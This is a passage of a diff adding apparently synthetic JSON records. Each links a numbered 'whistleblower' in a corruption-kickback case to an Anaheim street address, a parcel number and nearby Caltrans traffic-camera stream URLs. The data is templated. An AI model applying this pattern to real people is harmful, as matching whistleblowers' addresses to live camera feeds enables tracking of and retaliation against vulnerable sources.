+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #23 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0576",
+      "entity_name": "WHISTLEBLOWER 024",
+      "address": "1024 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-24",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #24 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0577",
+      "entity_name": "WHISTLEBLOWER 025",
+      "address": "1025 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-25",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #25 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0578",
+      "entity_name": "WHISTLEBLOWER 026",
+      "address": "1026 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-26",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #26 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0579",
+      "entity_name": "WHISTLEBLOWER 027",
+      "address": "1027 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-27",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #27 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0580",
+      "entity_name": "WHISTLEBLOWER 028",
+      "address": "1028 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-28",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #28 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0581",
+      "entity_name": "WHISTLEBLOWER 029",
+      "address": "1029 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-29",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #29 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0582",
+      "entity_name": "WHISTLEBLOWER 030",
+      "address": "1030 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-30",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #30 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0583",
+      "entity_name": "WHISTLEBLOWER 031",
+      "address": "1031 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-31",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #31 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0584",
+      "entity_name": "WHISTLEBLOWER 032",
+      "address": "1032 EAST BALL ROAD SUITE 2, ANAHEIM, CA",
+      "apn": "178-431-32",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #32 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0585",
+      "entity_name": "WHISTLEBLOWER 033",
+      "address": "1033 EAST BALL ROAD SUITE 3, ANAHEIM, CA",
+      "apn": "178-431-33",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #33 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0586",
+      "entity_name": "WHISTLEBLOWER 034",
+      "address": "1034 EAST BALL ROAD SUITE 4, ANAHEIM, CA",
+      "apn": "178-431-34",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #34 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0587",
+      "entity_name": "WHISTLEBLOWER 035",
+      "address": "1035 EAST BALL ROAD SUITE 5, ANAHEIM, CA",
+      "apn": "178-431-35",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #35 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0588",
+      "entity_name": "WHISTLEBLOWER 036",
+      "address": "1036 EAST BALL ROAD SUITE 6, ANAHEIM, CA",
+      "apn": "178-431-36",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #36 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0589",
+      "entity_name": "WHISTLEBLOWER 037",
+      "address": "1037 EAST BALL ROAD SUITE 7, ANAHEIM, CA",
+      "apn": "178-431-37",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #37 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0590",
+      "entity_name": "WHISTLEBLOWER 038",
+      "address": "1038 EAST BALL ROAD SUITE 8, ANAHEIM, CA",
+      "apn": "178-431-38",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #38 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0591",
+      "entity_name": "WHISTLEBLOWER 039",
+      "address": "1039 EAST BALL ROAD SUITE 9, ANAHEIM, CA",
+      "apn": "178-431-39",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #39 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0592",
+      "entity_name": "WHISTLEBLOWER 040",
+      "address": "1040 EAST BALL ROAD SUITE 0, ANAHEIM, CA",
+      "apn": "178-431-40",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5112disneylanddr/i5112disneylanddr.jpg",
+          "lat": 33.82500000008004,
+          "lon": -117.92406000022062
+        },
+        {
+          "camera_id": "2722",
+          "location_name": "I-5 : (113) Lincoln Avenue",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 1.06,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5LincolnAve.stream/playlist.m3u8",
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/i5113lincolnavenue/i5113lincolnavenue.jpg",
+          "lat": 33.83284999996941,
+          "lon": -117.93214000034989
+        },
+        {
+          "camera_id": "2757",
+          "location_name": "SR-91 : Lemon Street",
+          "route": "SR-91",
+          "direction": "East",
+          "distance_miles": 1.17,
+          "stream_url": null,
+          "image_url": "https://cwwp2.dot.ca.gov/data/d12/cctv/image/sr91lemonstreet/sr91lemonstreet.jpg",
+          "lat": 33.85354500020021,
+          "lon": -117.91359800033452
+        }
+      ],
+      "evidence": "Intake submission: Public Corruption Kickback | Evidence packet #40 detailing municipal land diversion."
+    },
+    {
+      "vector": "MUTUAL_AID_LEAD",
+      "severity": "HIGH",
+      "case_id": "CASE-0593",
+      "entity_name": "WHISTLEBLOWER 041",
+      "address": "1041 EAST BALL ROAD SUITE 1, ANAHEIM, CA",
+      "apn": "178-431-41",
+      "proximity_cctv": [
+        {
+          "camera_id": "2721",
+          "location_name": "I-5 : (112) Disneyland Dr.",
+          "route": "I-5",
+          "direction": "North",
+          "distance_miles": 0.98,
+          "stream_url": "https://wzmedia.dot.ca.gov/D12/NB5DisneylandDr.stream/playlist.m3u8",
